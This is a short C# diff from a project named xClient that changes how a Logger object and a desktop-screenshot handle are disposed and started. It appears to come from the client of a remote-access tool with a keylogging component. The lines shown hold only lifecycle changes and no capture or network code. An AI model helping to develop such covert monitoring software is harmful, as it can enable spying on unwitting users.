@@ -47,7 +47,7 @@ namespace xClient
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (Logger.Instance != null)
-                Logger.Instance.Enabled = false;
+                Logger.Instance.Dispose();
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -145,7 +145,7 @@ namespace xClient
                 {
                     new Thread(() =>
                     {
-                        Logger logger = new Logger(15000) { Enabled = true };
+                        Logger logger = new Logger(15000);
                     }).Start();
                 }
             }
